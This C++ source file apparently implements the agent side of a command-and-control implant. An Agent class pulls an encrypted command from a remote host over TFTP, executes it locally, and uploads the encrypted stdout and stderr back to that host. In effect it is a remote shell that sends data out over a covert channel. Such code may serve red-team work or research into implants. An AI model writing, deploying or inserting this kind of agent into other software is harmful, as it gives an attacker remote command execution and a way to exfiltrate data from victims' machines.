#include "Agent.h"
#include "Packer.h"
#include "Transport/TFTPClient.h"

#include "easylogging++.h"
#include <format>


Agent::Agent(std::string host,  std::string encryptionKey, uint16_t port)
: m_host(host), m_port(port), m_encryptionKey(encryptionKey)
{ }

std::string Agent::GetCommand()
{
    TFTPClient client(m_host, m_port);
    
    std::vector<BYTE> command;
    TFTPClient::Status status = client.Get(command, TFTPClient::GetDownloadedDefaultFName()); 
    if(status != TFTPClient::Status::kSuccess)
    {
        LOG(ERROR) << "Error while getting command: " << TFTPClient::ErrorDescription(status);
        return "";
    }

    Packer packer(m_encryptionKey);
    std::vector<BYTE> unpacked = packer.Unpack(command);
    std::ostringstream oss;
    for (auto e : unpacked){
        oss << e;
    }
    return oss.str();
}

bool Agent::SendResult(CommandResult result)
{
    
    Packer packer(m_encryptionKey);
    std::string plaintext_result = "stdout:\n" + result.std_out +  "\nstderr:\n" + result.std_err;
    std::vector<BYTE> data(plaintext_result.begin(), plaintext_result.end());
    std::vector<BYTE> packed_data = packer.Pack(data);

    UdpSocket sock;
    TFTPClient client(&sock, m_host, m_port);
    TFTPClient::Status status = client.Put(packed_data, TFTPClient::GetUploadedUniqueFName());
    if(status != TFTPClient::Status::kSuccess)
    {
        LOG(ERROR) << "Error while sending results: " << TFTPClient::ErrorDescription(status);
        return false;
    }
    return true;
}


void Agent::DoIteration()
{
    std::string command = GetCommand();
    if(command.empty())
    {
        LOG(ERROR) << "Command not found.";
        return;
    }
    // using default timeout
    CommandResult result = Executor::Execute(command);
    VLOG(1) << "result.exitStatus: " << Executor::ErrorDescription(result.exitCode);
    VLOG(1) << "result.stdout: " << result.std_out; 
    VLOG(1) << "result.stderr: " << result.std_err; 
    if(SendResult(result))
    {
        LOG(INFO) << "Result was successfuly sent.";
    }
}